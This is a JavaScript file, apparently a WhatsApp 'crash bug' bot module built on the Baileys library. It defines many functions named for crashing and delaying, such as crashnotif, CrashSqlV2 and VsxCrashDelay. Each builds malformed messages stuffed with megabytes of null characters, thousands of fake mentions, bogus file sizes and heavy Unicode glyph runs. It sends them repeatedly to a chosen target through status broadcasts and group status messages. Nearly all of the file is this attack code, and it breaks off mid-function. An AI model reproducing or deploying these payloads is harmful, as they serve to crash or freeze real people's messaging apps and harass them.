import { generateWAMessageFromContent } from "@whiskeysockets/baileys";
import fs from "fs";
const { prim, generateWAMessageFromContent, proto, prepareWAMessageMedia } = global;

// =============================================
//     ZONE POUR COLLER LES FONCTIONS DU PROF
// =============================================

async function intdress(prim, target) {
  for (let i = 0; i < 10; i++) {
    await prim.relayMessage("status@broadcast",
      {
        interactiveResponseMessage: {
          body: {
            text: "🇭🇹 .DsPrimis",
            format: "EXTENSIONS_1"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: "\u0000".repeat(1000),
            version: 3
          },
          contextInfo: {
            groupMentions: Array.from({ length: 2000 }, () => ({
              groupJid: `1${Math.floor(Math.random() * 500000)}@g.us`,
              groupSubject: " #VsPCore "
            }))
          }
        }
      },
      {
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: { status_setting: "contacts" },
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: []
                  }
                ]
              }
            ]
          }
        ]
      }
    );
  }
  await sleep(1000)
}

async function iNTofmSqL(prim, target) {
  for (let i = 0; i < 10; i++) {
    await prim.relayMessage("status@broadcast",
      {
        botInvokeMessage: {
          message: {
            messageContextInfo: {
              messageSecret: crypto.randomBytes(32),
              deviceListMetadata: {
                senderKeyIndex: 0,
                senderTimestamp: Date.now(),
                recipientKeyIndex: 0
              },
              deviceListMetadataVersion: 2
            },
            interactiveResponseMessage: {
              body: {
                text: ".D5!Primis¿?",
                format: "EXTENSIONS_1"
              },
              nativeFlowResponseMessage: {
                name: (["address_message", "call_permission_request", "galaxy_message"][(i + (Math.random() < 0.5 ? 1 : 0)) % 3]),
                paramsJson: "{ D5: { status: true } }",
                version: 3
              },
              contextInfo: {
                participant: prim.user.id,
                remoteJid: "@dsprimis",
                fromMe: true,
                statusAttributionType: 2,
                urlTrackingMap: {
                  urlTrackingMapElements: Array.from(
                    { length: 500000 },
                    () => ({ type: 1 })
                  )
                }
              }
            }
          }
        }
      },
      {
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: { status_setting: "allowlist" },
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: []
                  }
                ]
              }
            ]
          }
        ]
      }
    )
  }
  await sleep(1000)
}





async function iNTxSqL(prim, target) {
  for (let i = 0; i < 10; i++) {
    await prim.relayMessage("status@broadcast",
      {
        interactiveResponseMessage: {
          body: {
            text: ".Primis 👁‍🗨",
            format: "EXTENSIONS_1"
          },
          nativeFlowResponseMessage: {
            name: (["address_message","call_permission_request"][(i + (Math.random() < 0.5 ? 1 : 0)) % 2]),
            paramsJson: "{",
            version: 3
          },
          contextInfo: {
            remoteJid: "@dsprimis",
            urlTrackingMap: {
              urlTrackingMapElements: Array.from(
                { length: 200900 },
                (_, D5Primis) => ({ type: 1 })
              )
            }
          }
        }
      },
      {
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: { status_setting: "allowlist" },
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: []
                  }
                ]
              }
            ]
          }
        ]
      }
    );
  }
  await sleep(1000);
}

async function dandelionlay(target, mention) {
  const X = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: "Primis",
    title: "XxX",
    artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
  };

  const message1 = {
    requestPhoneNumberMessage: {
      contextInfo: {
        businessMessageForwardInfo: {
          businessOwnerJid: "13135550002@s.whatsapp.net"
        },
        stanzaId: "XNecrosis" + "-Id" + Math.floor(Math.random() * 99999),
        forwardingScore: 100,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363321780349272@newsletter",
          serverMessageId: 1,
          newsletterName: "ោ៝".repeat(10000)
        },
        mentionedJid: [
          "13135550002@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () =>
            `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
          )
        ],
        annotations: [
          {
            embeddedContent: {
              X
            },
            embeddedAction: true
          }
        ]
      }
    }
  };
  
  const message2 = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "$", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "{}"
        },
        contextInfo: {
          participant: target,
          mentionedJid: Array.from(
            { length: 1900 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
        ),
        quotedMessage: {
           paymentInviteMessage: {
             serviceType: 3,
             expiryTimestamp: Date.now() + 1814400000
             },
           },
         },
       },
     },
   };
   
  const message3 = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
          remoteJid: "X",
          participant: "0@s.whatsapp.net",
          stanzaId: "1234567890ABCDEF",
           mentionedJid: [
             "6285215587498@s.whatsapp.net",
             ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };
  
  const msg = generateWAMessageFromContent(target, message1, message2, message3, {});

  await prim.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  if (mention) {
    await prim.relayMessage(target, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: {
          is_status_mention: " kill "
        },
        content: undefined
      }]
    });
  }
}

async function NullMemek(target) {
  let msg = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from({ length:2000 }, (_, y) => `1313555000${y + 1}@s.whatsapp.net`)
      }, 
      body: {
        text: "D5!Primis¿?",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "address_message",
        paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"Squichy\",\"landmark_area\":\"X\",\"address\":\"@null\",\"tower_number\":\"@null\",\"prim\":\"Ds Primis\",\"name\":\"@null\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"prim : ${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, { userJid:target });

  await prim.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target, "13135550002@s.whatsapp.net"],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}

async function gsCp(target) {
  await prim.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "D5!Primis¿?",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request", 
            paramsJson: "\u0000".repeat(1000000),
            version: 3
          }
        }
      }
    }
  }, { participant: { jid: target }});
}

async function jokowi(target, Ptcp = true) {
  await prim.relayMessage(target, {
      groupMentionedMessage: {
          message: {
              interactiveMessage: {
                  header: {
                      documentMessage: {
                          url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                          mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                          fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                          fileLength: "9999999999999999",
                          pageCount: 0x9184e729fff,
                          mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                          fileName: "🩸🗿",
                          fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                          directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                          mediaKeyTimestamp: "1715880173",
                          contactVcard: true
                      },
                      title: "🩸🗿" ,
                      hasMediaAttachment: true
                  },
                  body: {
                      text: "ꦽ".repeat(50000) + "_*~@8~*_\n".repeat(50000) + '@8'.repeat(50000),
                  },
                  nativeFlowMessage: {},
                  contextInfo: {
                      mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                      groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "anjay" }]
                  }
              }
          }
      }
  }, { participant: { jid: target } }, { messageId: null });
}


async function crashnotif(prim, target) {
  if (!prim || !target) {
    return;
  }
  const VoidSystemPayload = "Primis - D5" +
    "ꦽ".repeat(10000) +
    "𑇂𑆵𑆴𑆿".repeat(10000) +
    "꙰⃟".repeat(10000) +
    "\u0000".repeat(10000) +
    "𑜦𑜠".repeat(10000);
    const XandroidUi = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              hasMediaAttachment: false
            },
            body: {
              text: ""
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "cta_url",
                  buttonParamsJson: JSON.stringify({
                    display_text: "OKAY", 
                    url: "https://" + "𑜦𑜠".repeat(5000) + ".com" 
                  })
                }
              ]
            },
            contextInfo: {
              externalAdReply: {
                renderLargerThumbnail: false,
                showAdAttribution: false
              }
            }
          }
        }
      }
    };
      await prim.relayMessage(target, XandroidUi, {
        messageId: prim.generateMessageTag()
      });
}

async function invisblekontak(target) {
    let virtex = `\n`.repeat(1002000)
    const generateMessage = {
        viewOnceMessage: {
            message: {
                contactMessage: {
                    displayName: "\u0000".repeat(1000),
                    vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;${"\u0000".repeat(900000)}\nitem1.TEL;waid=17409551555:+1 (740) 955-1555\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
                    contextInfo: {
                        mentionedJid: Array.from(
                            { length: 2000 },
                            () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                        ),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await prim.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: {
                        jid: target
                    },
                    content: undefined
                }]
            }]
        }]
    });
}

async function Delaybulldor(prim, target) {
    const msg1 = {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath:
              "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileLength: { low: 1, high: 0, unsigned: true },
            mediaKeyTimestamp: {
              low: 1746112211,
              high: 0,
              unsigned: false,
            },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 1995 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
              ],
              groupMentions: [],
              entryPointConversionSource: "non_contact",
              entryPointConversionApp: "whatsapp",
              entryPointConversionDelaySeconds: 467593,
            },
            stickerSentTs: {
              low: -1939477883,
              high: 406,
              unsigned: false,
            },
            isAvatar: false,
            isAiSticker: false,
            isLottie: false,
          },
        },
      },
    };

    const msg2 = {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_573578875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/webp",
            fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
            fileLength: "1173741824",
            mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
            fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
            directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
            mediaKeyTimestamp: "1743225419",
            isAnimated: false,
            viewOnce: false,
            contextInfo: {
              mentionedJid: [
                target,
                ...Array.from({ length: 1995 }, () => "92" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
              ],
              isSampled: true,
              participant: target,
              remoteJid: "status@broadcast",
              forwardingScore: 9999,
              isForwarded: true,
              quotedMessage: {
                viewOnceMessage: {
                  message: {
                    interactiveResponseMessage: {
                      body: { text: "", format: "DEFAULT" },
                      nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(99999),
                        version: 3,
                      },
                    },
                  },
                },
              },
            },
          },
        },
      },
    };

    const msg3 = [
      {
        ID: "69680D38",
        uri: "t62.43144-24/10000000_790307790709311_669779370012050552_n.enc?ccb=11-4&oh",
        buffer: "11-4&oh=01_Q5Aa3QGnIg1qMpL5Isc7LmIdU1IpoFsCqXialsd2OW2w0QQyUw&oe",
        sid: "5e03e0",
        SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
        ENCSHA256: "7ovcifxdIivWXIJgLvrRtPfs+pPXen7hoXtnoFKdP4s=",
        mkey: "Wql96TBHCa44YVS6eAlHGI6aYIYg6yc0kuOr0Y9WvtI=",
        mimetype: "video/mp4",
        fileLength: "99999999999",
        mediaKeyTimestamp: Math.floor(Date.now() / 1000),
        isViewOnce: false,
        viewOnce: false,
      },
      {
        ID: "69680D38",
        uri: "t62.43144-24/10000000_1534257120961824_1506742782412655205_n.enc?ccb=11-4&oh",
        buffer: "11-4&oh=01_Q5Aa3QEE7wUPnOULMZhlwnOw_bhHK6Gn7YI0hKpVm3yvw5dGMw&oe",
        sid: "5e03e0",
        SHA256: "I2ky6mhJmsFYmA+XRBoiaiTeYwnXGQAVXym+P/9YN6Y=",
        ENCSHA256: "HyfU2MhgxBQFFIohXT68RNZa0MAZRxDYB4X1c3I7JQY=",
        mkey: "Q5V7iUFs67ewh1qOOkqwQ9avc3u7qXAhyh2fIgVITCU=",
        mimetype: "image/webp",
        fileLength: "500000000",
        height: 10000,
        width: 10000,
      },
      {
        ID: "696C0CE0",
        uri: "t62.43144-24/10000000_1897784937438799_7647459696855315586_n.enc?ccb=11-4&oh",
        buffer: "01_Q5Aa3QGNjK1V4UGLF19HxU16vRNPFJQjy64pYSFbsuEm6bySdw&oe",
        sid: "5e03e0",
        SHA256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
        ENCSHA256: "RA4VN83TrKamnTjEolURSU7+2UUDY28EFBBQvFNh7e4=",
        mkey: "dTMN5/4/mFir4PcfgezcrIXqigJ8pl/COUQMxUsTaac=",
        mimetype: "application/pdf",
        fileLength: "2147483647",
        pageCount: 9999,
      },
    ];

    const msg4 = [
      {
        ID: "68917910",
        uri: "t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh",
        buffer: "11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe",
        sid: "5e03e0",
        SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
        ENCSHA256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
        mkey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
      },
      {
        ID: "68884987",
        uri: "t62.43144-24/10000000_1648989633156952_6928904571153366702_n.enc?ccb=11-4&oh",
        buffer: "B01_Q5Aa1wH1Czc4Vs-HWTWs_i_qwatthPXFNmvjvHEYeFx5Qvj34g&oe",
        sid: "5e03e0",
        SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
        ENCSHA256: "25fgJU2dia2Hhmtv1orOO+9KPyUTlBNgIEnN9Aa3rOQ=",
        mkey: "lAMruqUomyoX4O5MXLgZ6P8T523qfx+l0JsMpBGKyJc=",
      },
    ];

    for (const msg of [msg1, msg2, msg3, msg4]) {
      await prim.relayMessage("status@broadcast", msg, {
        messageId: undefined,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target } }],
              },
            ],
          },
        ],
      });
    }
  }




async function CrashSqlV2(target) {
  for (let p = 0; p < 20; p++) {

    const PouMsg = generateWAMessageFromContent(
      target,
      {
        interactiveResponseMessage: {
          contextInfo: {
            mentionedJid: Array.from(
              { length: 2000 },
              (_, p) => `6285983729${p + 1}@s.whatsapp.net`
            ),

            remoteJid: "PouGanteng??",

            forwardedAiBotMessageInfo: {
              botJid: "13135550202@bot",
              botName: "Suichy Rx",
              creator: "Primis"
            },

            statusAttributions: [
              {
                type: "STATUS_MENTION",
                music: {
                  authorName: "Primi",
                  songId: "1137812656623908",
                  title: "\u0000".repeat(1000),
                  author: "\x10".repeat(1000),
                  artistAttribution: "https://t.me/dsprimis",
                  isExplicit: true
                }
              }
            ]
          },

          body: {
            text: "\u0000".repeat(200),
            format: "DEFAULT"
          },

          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(900000),
            version: 3
          }
        }
      },
      {}
    );

    await prim.relayMessage(
      "status@broadcast",
      PouMsg.message,
      {
        messageId: PouMsg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined
                  }
                ]
              }
            ]
          }
        ]
      }
    );

  }
}

async function Delaymaklo(target, mention) {
  for (let i = 0; i < 50; i++) {
    const call = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "🪷 - SQUICHY RX IS ATTACK YOU - 🪷",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: "\u0000".repeat(1045000),
                version: 3
              }
            }
          }
        }
      },
      {
        userJid: target,
        quoted: null
      }
    );

    const msg = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "🪷 - SQUICHY RX IS ATTACK YOU - 🪷",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: "\u0000".repeat(1000000),
                version: 3
              }
            }
          }
        }
      },
      {
        userJid: target,
        quoted: null
      }
    );

    await prim.relayMessage(
      target,
      { groupStatusMessageV2: { message: call.message } },
      mention
        ? { messageId: call.key.id, participant: { jid: target } }
        : { messageId: call.key.id }
    );
  }
}

async function tes(prim, target) {
  const ZhtxRizz = "\u0000".repeat(13000);

  const ZhtxRizzMsg = {
    extendedTextMessage: {
      text: "D5 | Primis -Is Here" + ZhtxRizz,
      matchedText: "D5 | Primis -Is Here" + ZhtxRizz,
      url: `https://arkaganteng.com/${ZhtxRizz}`,
      title: "X",
      description: "D5 | Primis -Is Here" + ZhtxRizz,
      previewType: 0,
      contextInfo: {
        participant: target,
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from(
            { length: 1900 },
            () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        messageParamsJson: JSON.stringify({
          nativeFlowMessage: {
            buttons: [
              {
                name: "order_payment",
                buttonParamsJson: JSON.stringify({
                  order_id: "ORDER_" + Math.floor(Math.random() * 999999),
                  amount: "9999999",
                  currency: "HT",
                  note: "by Primis" + ZhtxRizz,
                }),
              },
            ],
          },
        }),
      },
    },
  };

  let ZhTxRizz = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "D5 | Primis -Is Here",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1045000),
              version: 3,
            },
            entryPointConversionSource: "galaxy_message",
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 0,
      isForwarded: false,
      font: Math.floor(Math.random() * 9),
      background:
        "#" +
        Math.floor(Math.random() * 16777215)
          .toString(16)
          .padStart(6, "0"),
    }
  );

  await prim.relayMessage("status@broadcast", ZhTxRizz.message, {
    messageId: ZhTxRizz.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined },
            ],
          },
        ],
      },
    ],
  });

  if (ZhTxRizz) {
    await prim.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: ZhTxRizz.key,
              type: 25,
            },
          },
        },
      },
      {}
    );
  }
}

async function Vsx(prim, target) {
  for (let i = 0; i < 150; i++) {
    const VSX = generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length: 2000 }, (_, r) => `6285983729${r + 1}@s.whatsapp.net`)
        },
        body: {
          text: "\u0000",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
          version: 3
        }
      }
    }, {});

    await prim.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: VSX.message
        }
      },
      {}
    );
  } 
}

async function ZenoEphemerals(target, ptcp = true) {
const msg = generateWAMessageFromContent(target, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
},
interactiveResponseMessage: {
body: {
text: "🩸 ༑ 𝗦𝗤𝗨𝗜𝗖𝗛𝗬 炎 𝗥𝗫⟅ ༑ 🩸",
format: "DEFAULT"
},
nativeFlowResponseMessage: {
name: "galaxy_message", 
paramsJson: "\u0000".repeat(1000000),
version: 3
},
contextInfo: {
isForwarded: true,
forwardingScore: 999,
businessMessageForwardInfo: {
businessOwnerJid: target,
}
}
}
}
}
}, {});

await prim.relayMessage(target, {
groupStatusMessageV2: {
message: msg.message,
},
}, ptcp ? 
{ 
messageId: msg.key.id, 
participant: { jid: target } 
} : { messageId: msg.key.id }
);
}

async function VsxCrashDelay(prim, target) {
  for (let i = 0; i < 150; i++) {
    const VSX = generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length: 2000 }, (_, r) => `6285983729${r + 1}@s.whatsapp.net`)
        },
        body: {
          text: "\u0000",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
          version: 3
        }
      }
    }, {});

    await prim.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: VSX.message
        }
      },
      {}
    );
  } 
}

async function D9XDELAYV2(prim, target) {
  for (let i = 0; i < 200; i++) {
    const UID9X = generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length: 2000 }, (_, r) => `2353267907${r + 1}@s.whatsapp.net`)
        },
        body: {
          text: "Primi",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
          version: 3
        }, 
        nativeFlowResponseMessageV2: {
          name: "menu_options",
          paramsJson: `{"display_text":"${"\u0000".repeat(900000)}","description":"${"\u0000".repeat(90000)}","id":"D9X99"}`,
          version: 3
        },
        nativeFlowResponseMessageV3: {
          name: "call_permission_request",
          paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
          version: 3
        }, 
        nativeFlowResponseMessageV4: {
          name: "payment_method",
          paramsJson: `{\"flow_cta\":\"${"{".repeat(70000)}\"}}`,
          version: 3
        }
      }
    }, {});

    await prim.relayMessage(
      target,
      {
        groupStatusMessageV2: {
          message: UID9X.message
        }
      },
      { participant: { jid: target } }
    );
  } 
}

async function Available01(prim, target, ptcp = true) {
  const VidMessage = generateWAMessageFromContent(target, {
    videoMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
      mimetype: "video/mp4",
      fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
      fileLength: "289511",
      seconds: 15,
      mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
      caption: "\n",
      height: 640,
      width: 640,
      fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
      directPath:
      "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1743848703",
      contextInfo: {
        isSampled: true,
        participant: target,
        mentionedJid: [
          ...Array.from(
            { length: 1900 },
            () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        remoteJid: "target",
        forwardingScore: 100,
        isForwarded: true,
        stanzaId: "123456789ABCDEF",
        quotedMessage: {
          businessMessageForwardInfo: {
            businessOwnerJid: "0@s.whatsapp.net",
          },
        },
      },
      streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
      thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
      thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
